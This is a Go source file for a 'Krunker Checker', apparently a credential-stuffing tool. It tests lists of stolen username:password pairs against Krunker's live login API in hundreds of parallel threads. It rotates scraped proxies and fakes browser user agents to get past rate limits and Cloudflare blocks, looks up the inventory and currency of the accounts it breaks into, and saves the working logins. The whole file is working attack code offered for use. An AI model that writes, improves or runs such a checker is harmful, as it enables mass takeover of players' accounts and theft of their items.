// services/login.go

package src

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorCyan   = "\033[36m"
	ColorGray   = "\033[90m"
	ColorPurple = "\033[35m"
	ColorBold   = "\033[1m"
)

const (
	usernameURL = "https://gapi.svc.krunker.io/auth/login/username"
	emailURL    = "https://gapi.svc.krunker.io/auth/login/email"
	origin      = "https://krunker.io/"
)

var (
	chromeVersions  = []string{"119.0.0.0", "118.0.0.0", "117.0.0.0", "116.0.0.0", "115.0.0.0"}
	firefoxVersions = []string{"119.0", "118.0", "117.0", "116.0", "115.0"}
	edgeVersions    = []string{"119.0.0.0", "118.0.0.0", "117.0.0.0"}
	windowsVersions = []string{"Windows NT 10.0; Win64; x64", "Windows NT 11.0; Win64; x64"}
	rng             = rand.New(rand.NewSource(time.Now().UnixNano()))
	fileMutex       sync.Mutex
)

type LoginRequest struct {
	Username string `json:"username,omitempty"`
	Email    string `json:"email,omitempty"`
	Password string `json:"password"`
}

type Account struct {
	Username string
	Password string
	Status   string
	Level    int
	Inv      int
	KR       int
}

type LoginResponse struct {
	Success bool   `json:"success"`
	Message string `json:"message"`
	Data    struct {
		Token    string `json:"token"`
		Username string `json:"username"`
		UserID   string `json:"user_id"`
	} `json:"data"`
}

type LiveCounters struct {
	Valid        int64
	Migrate      int64
	Verification int64
	Bad          int64
	Undetermined int64
	Checked      int64
	startTime    time.Time
}

func ProcessAccounts() error {
	if PromptForProxyScraping() {
		fmt.Println()
		err := ScrapeAndSaveProxies()
		if err != nil {
			fmt.Printf(ColorRed+"Proxy scraping failed: %v\n"+ColorReset, err)
			fmt.Printf(ColorYellow + "Will try to use existing proxies if available...\n\n" + ColorReset)
		}
	} else {
		fmt.Printf(ColorCyan + "Skipping proxy scraping...\n\n" + ColorReset)
	}

	if _, err := os.Stat("data/proxies.txt"); os.IsNotExist(err) {
		fmt.Printf(ColorRed + "No proxies.txt file found!\n" + ColorReset)
		fmt.Printf(ColorYellow + "You need proxies to run the checker. Scraping proxies now...\n\n" + ColorReset)

		err := ScrapeAndSaveProxies()
		if err != nil {
			return fmt.Errorf("failed to scrape proxies and no existing proxies found: %w", err)
		}
	}

	if err := InitializeProxyManager(); err != nil {
		return fmt.Errorf("failed to initialize proxy manager: %w", err)
	}

	if err := os.MkdirAll("results", 0755); err != nil {
		return fmt.Errorf("failed to create results directory: %w", err)
	}

	accounts, err := readAccountsFile("data/accounts.txt")
	if err != nil {
		return fmt.Errorf("failed to read accounts file: %w", err)
	}

	if len(accounts) == 0 {
		return fmt.Errorf("no accounts found in data/accounts.txt")
	}

	numWorkers := getThreadCount()
	fmt.Print("\033[2A\033[K")
	counters := &LiveCounters{
		startTime: time.Now(),
	}

	accountChan := make(chan Account, len(accounts))
	var wg sync.WaitGroup
	var statusWg sync.WaitGroup
	stopStatus := make(chan struct{})

	statusWg.Add(1)
	go updateStatus(counters, len(accounts), numWorkers, &statusWg, stopStatus)

	for _, account := range accounts {
		accountChan <- account
	}
	close(accountChan)

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			processAccounts(workerID, accountChan, counters)
		}(i)
	}

	wg.Wait()

	time.Sleep(300 * time.Millisecond)
	close(stopStatus)
	statusWg.Wait()

	proxyManager := proxym()
	if err := proxyManager.SaveGoodProxies(); err != nil {
		fmt.Printf(ColorRed+"Error updating proxies.txt: %v\n"+ColorReset, err)
	} else {
		fmt.Printf(ColorCyan + "\nSuccessfully cleaned and updated proxies.txt. Bad proxies removed.\n" + ColorReset)
	}

	return nil
}

func processAccounts(_ int, accountChan <-chan Account, counters *LiveCounters) {
	const maxAccountRetries = 20
	proxyManager := proxym()

	for account := range accountChan {
		var status string
		var proxy string
		var err error
		var success bool

		for i := 0; i < maxAccountRetries; i++ {
			proxy = proxyManager.GetNextProxy()
			if proxy == "" {
				break
			}

			status, _, err = performLogin(account, proxy)

			if err != nil {
				handleProxyError(err, proxy, proxyManager)
				if proxyManager.GetActiveProxyCount() == 0 {
					break
				}
				continue
			}

			success = true
			break
		}

		atomic.AddInt64(&counters.Checked, 1)

		if !success {
			apn("results/undetermined.txt", account)
			atomic.AddInt64(&counters.Undetermined, 1)
			continue
		}

		account.Status = status

		if status == "login_ok" || status == "needs_migrate" {
			fetchAccountStats(&account, proxy)
		}

		stat(account, counters)
	}
}

func fetchAccountStats(account *Account, proxy string) {
	var stats *PlayerStats
	var err error
	var targetUsername string

	if isEmail(account.Username) {
		targetUsername, err = GetUsernameFromWebSocket(*account, proxy)
		if err != nil || targetUsername == "" {
			return
		}
	} else {
		targetUsername = account.Username
	}

	maxStatsRetries := 3
	for i := 0; i < maxStatsRetries; i++ {
		stats, err = FetchPlayerStats(targetUsername, proxy)
		if err == nil && stats != nil {
			account.Level = CalculateLevel(stats.PlayerScore)
			account.Inv = stats.PlayerSkinValue
			account.KR = stats.PlayerFunds
			break
		}

		if i == 0 && !isEmail(account.Username) && targetUsername != account.Username {
			stats, err = FetchPlayerStats(account.Username, proxy)
			if err == nil && stats != nil {
				account.Level = CalculateLevel(stats.PlayerScore)
				account.Inv = stats.PlayerSkinValue
				account.KR = stats.PlayerFunds
				break
			}
		}

		time.Sleep(500 * time.Millisecond)
	}
}

func stat(account Account, counters *LiveCounters) {
	if (account.Status == "login_ok" || account.Status == "needs_migrate") &&
		account.Level == 0 && account.Inv == 0 && account.KR == 0 { // for cleaner results, its not meant failed but trash accs wont be saved that have trash stats
		return
	}

	switch account.Status {
	case "login_ok":
		apn("results/login_ok.txt", account)
		atomic.AddInt64(&counters.Valid, 1)
	case "needs_migrate":
		apn("results/needs_migrate.txt", account)
		atomic.AddInt64(&counters.Migrate, 1)
	case "needs_verification":
		apn("results/needs_verification.txt", account)
		atomic.AddInt64(&counters.Verification, 1)
	default:
		apn("results/bad_accounts.txt", account)
		atomic.AddInt64(&counters.Bad, 1)
	}
}

func handleProxyError(err error, proxy string, proxyManager *ProxyManager) {
	errMsg := err.Error()
	if strings.Contains(errMsg, "cloudflare") {
		proxyManager.RemoveProxy(proxy)
	} else if strings.Contains(errMsg, "rate limit exceeded") {
		proxyManager.ShelveProxy(proxy)
	}
}

func performLogin(account Account, proxyURL string) (string, LoginResponse, error) {
	var loginResp LoginResponse
	var loginReq LoginRequest
	var targetURL string

	if isEmail(account.Username) {
		loginReq = LoginRequest{
			Email:    account.Username,
			Password: account.Password,
		}
		targetURL = emailURL
	} else {
		loginReq = LoginRequest{
			Username: account.Username,
			Password: account.Password,
		}
		targetURL = usernameURL
	}

	jsonData, err := json.Marshal(loginReq)
	if err != nil {
		return "", loginResp, fmt.Errorf("failed to marshal login request: %w", err)
	}

	req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return "", loginResp, fmt.Errorf("failed to create request: %w", err)
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", GenerateUserAgent())
	req.Header.Set("Origin", origin)
	req.Header.Set("Referer", "https://krunker.io/")

	client := hh1(proxyURL)
	resp, err := client.Do(req)
	if err != nil {
		return "", loginResp, fmt.Errorf("request failed: %w (proxy: %s)", err, proxyURL)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", loginResp, fmt.Errorf("failed to read response body: %w", err)
	}

	bodyStr := string(body)

	if strings.Contains(bodyStr, "\"login_ok\"") || strings.Contains(bodyStr, "\"success\":true") {
		json.Unmarshal(body, &loginResp)
	}

	if strings.Contains(bodyStr, "Cloudflare") && strings.Contains(bodyStr, "Sorry, you have been blocked") {
		return "", loginResp, fmt.Errorf("cloudflare block")
	}
	if strings.Contains(bodyStr, "Rate limit exceeded") || strings.Contains(bodyStr, "Too Many Requests") {
		return "", loginResp, fmt.Errorf("rate limit exceeded")
	}

	return parseLoginStatus(bodyStr), loginResp, nil
}

func parseLoginStatus(bodyStr string) string {
	if strings.Contains(bodyStr, "\"login_ok\"") {
		return "login_ok"
	}
	if strings.Contains(bodyStr, "\"ensure_migrated\"") {
		return "needs_migrate"
	}
	if strings.Contains(bodyStr, "\"ensure_verified\"") {
		return "needs_verification"
	}
	if strings.Contains(bodyStr, "password incorrect") ||
		strings.Contains(bodyStr, "bad credentials err") ||
		strings.Contains(bodyStr, "provided password needs to be at least 8 characters") {
		return "password_incorrect"
	}
	if strings.Contains(bodyStr, "username incorrect") || strings.Contains(bodyStr, "email not found") {
		return "username_incorrect"
	}
	if strings.Contains(bodyStr, "invalid account or password") {
		return "invalid"
	}
	return "unknown"
}

func getJWTToken(account Account, proxyURL string) (string, error) {
	var loginReq LoginRequest
	var targetURL string

	if isEmail(account.Username) {
		loginReq = LoginRequest{
			Email:    account.Username,
			Password: account.Password,
		}
		targetURL = emailURL
	} else {
		loginReq = LoginRequest{
			Username: account.Username,
			Password: account.Password,
		}
		targetURL = usernameURL
	}

	jsonData, err := json.Marshal(loginReq)
	if err != nil {
		return "", fmt.Errorf("failed to marshal login request: %w", err)
	}

	req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return "", fmt.Errorf("failed to create request: %w", err)
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", GenerateUserAgent())
	req.Header.Set("Origin", origin)
	req.Header.Set("Referer", "https://krunker.io/")

	client := hh1(proxyURL)
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read response body: %w", err)
	}

	return extractTokenFromResponse(body)
}

func extractTokenFromResponse(body []byte) (string, error) {
	bodyStr := string(body)
	var token string

	var loginResponse struct {
		Success bool   `json:"success"`
		Message string `json:"message"`
		Data    struct {
			Token    string `json:"token"`
			Username string `json:"username"`
			UserID   string `json:"user_id"`
		} `json:"data"`
	}

	err := json.Unmarshal(body, &loginResponse)
	if err == nil && loginResponse.Success && loginResponse.Data.Token != "" {
		return loginResponse.Data.Token, nil
	}

	var altResponse struct {
		Token    string `json:"token"`
		Username string `json:"username"`
		UserID   string `json:"user_id"`
		Success  bool   `json:"success"`
	}

	err = json.Unmarshal(body, &altResponse)
	if err == nil && altResponse.Token != "" {
		return altResponse.Token, nil
	}

	jwtPattern := `"[^"]*eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*"`
	re := regexp.MustCompile(jwtPattern)
	matches := re.FindAllString(bodyStr, -1)

	if len(matches) > 0 {
		token = strings.Trim(matches[0], `"`)
		return token, nil
	}

	if strings.Contains(bodyStr, `"token"`) {
		tokenIndex := strings.Index(bodyStr, `"token"`)
		if tokenIndex != -1 {
			remaining := bodyStr[tokenIndex:]
			colonIndex := strings.Index(remaining, ":")
			if colonIndex != -1 {
				afterColon := remaining[colonIndex+1:]
				afterColon = strings.TrimSpace(afterColon)
				if strings.HasPrefix(afterColon, `"`) {
					endQuote := strings.Index(afterColon[1:], `"`)
					if endQuote != -1 {
						token = afterColon[1 : endQuote+1]
						return token, nil
					}
				}
			}
		}
	}

	return "", fmt.Errorf("login failed or no token received")
}

func GenerateUserAgent() string {
	browsers := []string{"chrome", "firefox", "edge"}
	browser := browsers[rng.Intn(len(browsers))]

	switch browser {
	case "chrome":
		return generateChromeUA()
	case "firefox":
		return generateFirefoxUA()
	case "edge":
		return generateEdgeUA()
	default:
		return generateChromeUA()
	}
}

func generateChromeUA() string {
	version := chromeVersions[rng.Intn(len(chromeVersions))]
	osString := windowsVersions[rng.Intn(len(windowsVersions))]
	return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", osString, version)
}
func generateFirefoxUA() string {
	version := firefoxVersions[rng.Intn(len(firefoxVersions))]
	osString := "Windows NT 10.0; Win64; x64"
	return fmt.Sprintf("Mozilla/5.0 (%s; rv:109.0) Gecko/20100101 Firefox/%s", osString, version)
}
func generateEdgeUA() string {
	version := edgeVersions[rng.Intn(len(edgeVersions))]
	osString := windowsVersions[rng.Intn(len(windowsVersions))]
	return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edg/%s", osString, version, version)
}

func getThreadCount() int {
	fmt.Print(ColorCyan + "threads (default 500): " + ColorReset)

	var input string
	fmt.Scanln(&input)

	if input == "" {
		return 500
	}

	threads, err := strconv.Atoi(input)
	if err != nil || threads <= 0 {
		fmt.Printf(ColorRed + "Invalid input, using default 500 threads\n" + ColorReset)
		return 500
	}

	if threads > 1000 {
		fmt.Printf(ColorYellow+"Warning: Using %d threads might be too aggressive\n"+ColorReset, threads)
	}

	return threads
}

func readAccountsFile(filename string) ([]Account, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("failed to open file %s: %w", filename, err)
	}
	defer file.Close()

	var accounts []Account
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") || strings.Contains(line, "=") {
			continue
		}

		parts := strings.Split(line, ":")
		if len(parts) < 2 {
			continue
		}

		accounts = append(accounts, Account{
			Username: strings.TrimSpace(parts[0]),
			Password: strings.TrimSpace(strings.Join(parts[1:], ":")),
		})
	}

	return accounts, scanner.Err()
}

func apn(filename string, account Account) error {
	fileMutex.Lock()
	defer fileMutex.Unlock()

	dir := filepath.Dir(filename)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create directory: %w", err)
	}

	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Errorf("failed to open file for appending: %w", err)
	}
	defer file.Close()

	var line string
	if account.Status == "login_ok" || account.Status == "needs_migrate" {
		line = fmt.Sprintf("%s:%s (LVL=%d),(Inv=%d),(KR=%d)\n",
			account.Username, account.Password, account.Level, account.Inv, account.KR)
	} else {
		line = fmt.Sprintf("%s:%s\n", account.Username, account.Password)
	}

	if _, err := file.WriteString(line); err != nil {
		return fmt.Errorf("failed to write account: %w", err)
	}

	return file.Sync()
}

func updateStatus(counters *LiveCounters, totalAccounts int, numThreads int, wg *sync.WaitGroup, stop chan struct{}) {
	defer wg.Done()
	ticker := time.NewTicker(200 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-stop:
			return
		case <-ticker.C:
			displayStatus(counters, totalAccounts, numThreads)
		}
	}
}

func displayStatus(counters *LiveCounters, totalAccounts int, numThreads int) {
	fmt.Print("\033[H\033[2J")

	checked := atomic.LoadInt64(&counters.Checked)
	valid := atomic.LoadInt64(&counters.Valid)
	migrate := atomic.LoadInt64(&counters.Migrate)
	verification := atomic.LoadInt64(&counters.Verification)
	bad := atomic.LoadInt64(&counters.Bad)

	proxyManager := proxym()
	activeProxies, badProxies := proxyManager.GetProxyStats()

	elapsed := time.Since(counters.startTime)
	var cpm int64
	if elapsed.Minutes() > 0 {
		cpm = int64(float64(checked) / elapsed.Minutes())
	}

	var avgTimePerCheck string
	if checked > 0 {
		avgMs := elapsed.Milliseconds() / checked
		avgTimePerCheck = fmt.Sprintf("%dms", avgMs)
	} else {
		avgTimePerCheck = "0ms"
	}

	fmt.Printf("%sKrunker Checker - @cleanest%s | Checking %s%s%s accounts (%s%d%s threads), %s%d%s CPM)\n\n",
		ColorBold, ColorReset,
		ColorCyan, formatNumber(totalAccounts), ColorReset,
		ColorCyan, numThreads, ColorReset,
		ColorCyan, cpm, ColorReset)

	fmt.Printf("%sHits:%s > %s%s%s\n",
		ColorGreen, ColorReset, ColorGreen, formatNumber(int(valid)), ColorReset)
	fmt.Printf("%sMigrate:%s > %s%s%s\n",
		ColorYellow, ColorReset, ColorYellow, formatNumber(int(migrate)), ColorReset)
	fmt.Printf("%sVerify:%s > %s%s%s\n",
		ColorPurple, ColorReset, ColorPurple, formatNumber(int(verification)), ColorReset)
	fmt.Printf("%sBad:%s > %s%s%s\n\n",
		ColorRed, ColorReset, ColorRed, formatNumber(int(bad)), ColorReset)

	fmt.Printf("%sProxies:%s %s%d%s/%s%d%s\n",
		ColorCyan, ColorReset, ColorGreen, activeProxies, ColorReset, ColorRed, badProxies, ColorReset)

	hours := int(elapsed.Hours())
	minutes := int(elapsed.Minutes()) % 60
	seconds := int(elapsed.Seconds()) % 60
	timeStr := fmt.Sprintf("%02d:%02d:%02d", hours, minutes, seconds)

	fmt.Printf("%sTime elapsed:%s %s\n", ColorCyan, ColorReset, timeStr)
	fmt.Printf("%sAverage time per check:%s %s\n\n", ColorCyan, ColorReset, avgTimePerCheck)
	fmt.Printf("%s(Ctrl+C to quit)%s", ColorGray, ColorReset)
}

func formatNumber(n int) string {
	str := strconv.Itoa(n)
	if len(str) <= 3 {
		return str
	}

	var result []string
	for i, char := range str {
		if i > 0 && (len(str)-i)%3 == 0 {
			result = append(result, ",")
		}
		result = append(result, string(char))
	}

	return strings.Join(result, "")
}
